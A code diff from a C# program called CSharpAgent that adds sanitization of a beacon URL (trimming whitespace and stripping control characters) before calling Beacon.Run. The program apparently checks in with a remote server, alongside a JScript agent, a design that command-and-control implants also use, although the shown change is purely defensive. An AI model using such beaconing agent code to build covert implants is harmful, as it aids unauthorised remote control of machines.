@@ -61,7 +61,23 @@ namespace CSharpAgent
             }
             Diag.Show("[2] H_URL", beaconUrl);
 
-            Beacon.Run(beaconUrl);
+            // A URL never legitimately carries control/format chars or edge whitespace —
+            // a copy-pasted H_URL with an invisible U+200B or a cmd `&&` trailing space
+            // must not reach WebRequest. Same low-byte rule the identity headers use
+            // (Identity's WireSafe logic inline — Main runs before any header exists).
+            var wireUrl = beaconUrl.Trim();
+            for (var i = wireUrl.Length - 1; i >= 0; i--)
+            {
+                var b = wireUrl[i] & 0xFF;
+                if ((b < 0x20 && b != 0x09) || b == 0x7F) wireUrl = wireUrl.Remove(i, 1);
+            }
+            if (wireUrl.Length == 0)
+            {
+                Diag.Show("[exit] H_URL blank", "H_URL carried only whitespace/control chars — nothing to beacon");
+                return;
+            }
+
+            Beacon.Run(wireUrl);
             Diag.Show("[exit] Run returned",
                 "Beacon.Run returned — a fatal transport/protocol exit (see the last " +
                 "[exit] caption above this one, if any). Process ends; the JScript agent " +
